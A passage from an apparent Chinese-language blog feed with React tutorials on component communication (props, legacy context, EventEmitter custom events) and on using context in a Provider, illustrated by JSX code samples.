class="keyword">super</span>(...args);</span><br><span class="line">        <span class="keyword">this</span>.state = &#123;</span><br><span class="line">            isShowList3: <span class="literal">false</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    showConponent = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">            isShowList3: <span class="literal">true</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    hideConponent = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">            isShowList3: <span class="literal">false</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;button onClick=&#123;<span class="keyword">this</span>.showConponent&#125;&gt;显示Lists组件&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">                &#123;</span></span><br><span class="line"><span class="regexp">                    this.state.isShowList3 ?</span></span><br><span class="line"><span class="regexp">                        &lt;List3 hideConponent=&#123;this.hideConponent&#125; /</span>&gt;</span><br><span class="line">                    :</span><br><span class="line">                    <span class="literal">null</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="三、跨级组件通信"><a href="#三、跨级组件通信" class="headerlink" title="三、跨级组件通信"></a>三、跨级组件通信</h2><p><strong>层层组件传递props</strong></p><blockquote><p>例如A组件和B组件之间要进行通信,先找到A和B公共的父组件,A先向C组件通信,C组件通过props和B组件通信,此时C组件起的就是中间件的作用</p></blockquote><p><strong>使用context</strong></p><ul><li>context是一个全局变量,像是一个大容器,在任何地方都可以访问到,我们可以把要通信的信息放在context上,然后在其他组件中可以随意取到</li><li>但是React官方不建议使用大量context,尽管他可以减少逐层传递,但是当组件结构复杂的时候,我们并不知道context是从哪里传过来的;而且context是一个全局变量,全局变量正是导致应用走向混乱的罪魁祸首</li></ul><blockquote><p>下面例子中的组件关系: ListItem是List的子组件,List是app的子组件</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ListItem.jsx</span></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListItem</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 子组件声明自己要使用context</span></span><br><span class="line">    <span class="keyword">static</span> contextTypes = &#123;</span><br><span class="line">        color: PropTypes.string,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">        value: PropTypes.string,</span><br><span class="line">    &#125;</span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; value &#125; = <span class="keyword">this</span>.props;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;li style=&#123;&#123; <span class="attr">background</span>: <span class="keyword">this</span>.context.color &#125;&#125;&gt;</span><br><span class="line">                &lt;span&gt;&#123;value&#125;&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>li&gt;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> ListItem;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// List.jsx</span></span><br><span class="line"><span class="keyword">import</span> ListItem <span class="keyword">from</span> <span class="string">'./ListItem'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">List</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 父组件声明自己支持context</span></span><br><span class="line">    <span class="keyword">static</span> childContextTypes = &#123;</span><br><span class="line">        color: PropTypes.string,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">        list: PropTypes.array,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 提供一个函数,用来返回相应的context对象</span></span><br><span class="line">    getChildContext() &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            color: <span class="string">'red'</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; list &#125; = <span class="keyword">this</span>.props;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;ul&gt;</span><br><span class="line">                    &#123;</span><br><span class="line">                        list.map(<span class="function">(<span class="params">entry, index</span>) =&gt;</span></span><br><span class="line">                            &lt;ListItem key=&#123;<span class="string">`list-<span class="subst">$&#123;index&#125;</span>`</span>&#125; value=&#123;entry.text&#125; /&gt;,</span><br><span class="line">                       )</span><br><span class="line">                    &#125;</span><br><span class="line">                &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>div&gt;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// App.jsx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> List <span class="keyword">from</span> <span class="string">'./components/List'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> list = [</span><br><span class="line">    &#123;</span><br><span class="line">        text: <span class="string">'题目一'</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        text: <span class="string">'题目二'</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;List</span><br><span class="line">                    list=&#123;list&#125;</span><br><span class="line">                /&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="四、没有嵌套关系的组件通信"><a href="#四、没有嵌套关系的组件通信" class="headerlink" title="四、没有嵌套关系的组件通信"></a>四、没有嵌套关系的组件通信</h2><p><strong>使用自定义事件机制</strong></p><ul><li>在<code>componentDidMount</code>事件中,如果组件挂载完成,再订阅事件;在组件卸载的时候,在<code>componentWillUnmount</code>事件中取消事件的订阅;</li><li>以常用的发布/订阅模式举例,借用<code>Node.js Events</code>模块的浏览器版实现</li></ul><blockquote><p>下面例子中的组件关系: List1和List2没有任何嵌套关系,App是他们的父组件</p></blockquote><p>实现这样一个功能: 点击List2中的一个按钮,改变List1中的信息显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install events --save</span><br></pre></td></tr></table></figure><blockquote><p>在src下新建一个util目录里面建一个events.js</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import &#123; EventEmitter &#125; from &apos;events&apos;;</span><br><span class="line"></span><br><span class="line">export default new EventEmitter();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// List.jsx</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">List</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">        <span class="keyword">super</span>(props);</span><br><span class="line">        <span class="keyword">this</span>.state = &#123;</span><br><span class="line">            message: <span class="string">'List1'</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">        <span class="comment">// 组件装载完成以后声明一个自定义事件</span></span><br><span class="line">        <span class="keyword">this</span>.eventEmitter = emitter.addListener(<span class="string">'changeMessage'</span>, (message) =&gt; &#123;</span><br><span class="line">            <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">                message,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    componentWillUnmount() &#123;</span><br><span class="line">        emitter.removeListener(<span class="keyword">this</span>.eventEmitter);</span><br><span class="line">    &#125;</span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &#123;<span class="keyword">this</span>.state.message&#125;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default List;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/List2.jsx</span></span><br><span class="line"><span class="regexp">import React, &#123; Component &#125; from 'react';</span></span><br><span class="line"><span class="regexp">import emitter from '../u</span>til/events<span class="string">';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class List2 extends Component &#123;</span></span><br><span class="line"><span class="string">    handleClick = (message) =&gt; &#123;</span></span><br><span class="line"><span class="string">        emitter.emit('</span>changeMessage<span class="string">', message);</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">    render() &#123;</span></span><br><span class="line"><span class="string">        return (</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">                &lt;button onClick=&#123;this.handleClick.bind(this, '</span>List2<span class="string">')&#125;&gt;点击我改变List1组件中显示信息&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// APP.jsx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import React, &#123; Component &#125; from '</span>react<span class="string">';</span></span><br><span class="line"><span class="string">import List1 from '</span>./components/List1<span class="string">';</span></span><br><span class="line"><span class="string">import List2 from '</span>./components/List2<span class="string">';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">export default class App extends Component &#123;</span></span><br><span class="line"><span class="string">    render() &#123;</span></span><br><span class="line"><span class="string">        return (</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">                &lt;List1 /&gt;</span></span><br><span class="line"><span class="string">                &lt;List2 /&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>自定义事件是典型的发布订阅模式,通过向事件对象上添加监听器和触发事件来实现组件之间的通信</p></blockquote><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><ul><li>父组件向子组件通信: <code>props</code></li><li>子组件向父组件通信: 回调函数/自定义事件</li><li>跨级组件通信: 层层组件传递<code>props/context</code></li><li>没有嵌套关系组件之间的通信: 自定义事件</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/1480597-e9f0c8c8e859eed9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot;
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="react" scheme="http://blog.poetries.top/tags/react/"/>
    
      <category term="组件通信" scheme="http://blog.poetries.top/tags/%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/"/>
    
  </entry>
  
  <entry>
    <title>React之context</title>
    <link href="http://blog.poetries.top/2018/07/23/react-context/"/>
    <id>http://blog.poetries.top/2018/07/23/react-context/</id>
    <published>2018-07-23T01:50:12.000Z</published>
    <updated>2018-08-23T01:41:37.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><code>React</code> 组件之间的通信是基于 <code>props</code> 的单向数据流，即父组件通过 <code>props</code> 向子组件传值，亦或是子组件执行传入的函数来更新父组件的<code>state</code>，这都满足了我们大部分的使用场景</li><li>一般地，对于兄弟组件之间的通信，是通过它们共同的祖先组件进行的，即 Lifting State Up，官方文档也有介绍。组件一通过事件将状态变更通知它们共同的祖先组件，祖先组再将状态同步到组件二</li><li>但是，如果组件之间嵌套的比较深，即使提升状态到共同父组件，再同步状态到相应的组件还是需要一层一层的传递下去，可能会比较繁琐</li><li>在对应的场景中，<code>context</code> 就可以缩短父组件到子组件的属性传递路径</li></ul><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Parent <span class="keyword">from</span> <span class="string">'./Parent'</span></span><br><span class="line"><span class="keyword">import</span> ChildOne <span class="keyword">from</span> <span class="string">'../components/ChildOne'</span></span><br><span class="line"><span class="keyword">import</span> ChildTwo <span class="keyword">from</span> <span class="string">'../components/ChildTwo'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Container</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">        <span class="keyword">super</span>(props);</span><br><span class="line">        <span class="keyword">this</span>.state = &#123; <span class="attr">value</span>: <span class="string">''</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    changeValue = <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123; value &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    getChildContext() &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            value: <span class="keyword">this</span>.state.value,</span><br><span class="line">            changeValue: <span class="keyword">this</span>.changeValue</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;Parent&gt;</span><br><span class="line">                    &lt;ChildOne /&gt;</span><br><span class="line">                &lt;<span class="regexp">/Parent&gt;</span></span><br><span class="line"><span class="regexp">                &lt;Parent&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;ChildTwo /</span>&gt;</span><br><span class="line">                &lt;<span class="regexp">/Parent&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>div&gt;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Container.childContextTypes = &#123;</span><br><span class="line">    value: PropTypes.string,</span><br><span class="line">    changeValue: PropTypes.func</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Parent.jsx</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Parent = <span class="function">(<span class="params">props</span>) =&gt;</span> (</span><br><span class="line">    &lt;div &#123;...props&#125; /&gt;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Parent</span><br></pre></td></tr></table></figure><p>ChildOne.jsx</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">ChildOne</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    handleChange = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; changeValue &#125; = <span class="keyword">this</span>.context</span><br><span class="line">        changeValue(e.target.value)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                子组件一</span><br><span class="line">                &lt;input onChange=&#123;<span class="keyword">this</span>.handleChange&#125; /&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        )</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ChildOne.contextTypes = &#123;</span></span><br><span class="line"><span class="regexp">    changeValue: PropTypes.func</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>ChildTwo.jsx</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">ChildTwo</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                子组件二</span><br><span class="line">                &lt;p&gt;&#123;<span class="keyword">this</span>.context.value&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>div&gt;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ChildTwo.contextTypes = &#123;</span><br><span class="line">    value: PropTypes.string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在 <code>Container.childContextTypes</code> 中进行接口的声明，通过 <code>getChildContext</code> 返回更新后的<code>state</code>，在 <code>Child.contextTypes</code> 中声明要获取的接口，这样在子组件内部就能通过 <code>this.context</code> 获取到。通过 <code>Context</code> 这样一个中间对象，<code>ChildOne</code> 和 <code>ChildTwo</code> 就可以相互通信了</p></blockquote><h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><blockquote><p>组件嵌套传递属性，在导航里面引用<code>Page</code>中的变量</p></blockquote><ul><li>使用<code>context</code>来传递</li><li>使用props层级传递</li></ul><blockquote><p>使用<code>context</code>组件需要定义<code>propTypes</code>,需要严格校验、声明类型、字段</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Page</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> childContextTypes = &#123;</span><br><span class="line">       user:PropTypes.string</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">        <span class="keyword">super</span>(props)</span><br><span class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">user</span>:<span class="string">'poetries'</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getChildContext()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.state</span><br><span class="line">    &#125;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">          &lt;div&gt;</span><br><span class="line">            &lt;p&gt;我是&#123;<span class="keyword">this</span>.state.user&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">            &lt;Siderbar /</span>&gt;</span><br><span class="line">          &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        )</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">class Siderbar extends React.Component &#123;</span></span><br><span class="line"><span class="regexp">    static childContextTypes = &#123;</span></span><br><span class="line"><span class="regexp">       user:PropTypes.string</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    render()&#123;</span></span><br><span class="line"><span class="regexp">        return (</span></span><br><span class="line"><span class="regexp">          &lt;div&gt;</span></span><br><span class="line"><span class="regexp">            &lt;p&gt;侧边栏&lt;/</span>p&gt;</span><br><span class="line">            &lt;Navbar /&gt;</span><br><span class="line">          &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        )</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">class Navbar extends React.Component &#123;</span></span><br><span class="line"><span class="regexp">    static childContextTypes = &#123;</span></span><br><span class="line"><span class="regexp">       user:PropTypes.string</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    render()&#123;</span></span><br><span class="line"><span class="regexp">        return (</span></span><br><span class="line"><span class="regexp">          &lt;div&gt;</span></span><br><span class="line"><span class="regexp">            &lt;p&gt;我是&#123;this.context.user&#125;的导航栏&lt;/</span>p&gt;</span><br><span class="line">            &lt;Siderbar /&gt;</span><br><span class="line">          &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        )</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="context在Provider种应用"><a href="#context在Provider种应用" class="headerlink" title="context在Provider种应用"></a>context在Provider种应用</h2><blockquote><p><code>provider</code>组件就是使用<code>context</code>，把<code>store</code>放到<code>context</code>里，所有的子元素可以直接取到<code>store</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Provider</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> childContextTypes = &#123;</span><br><span class="line">        store:Protypes.object</span><br><span class="line">    &#125;</span><br><span class="line">    <span 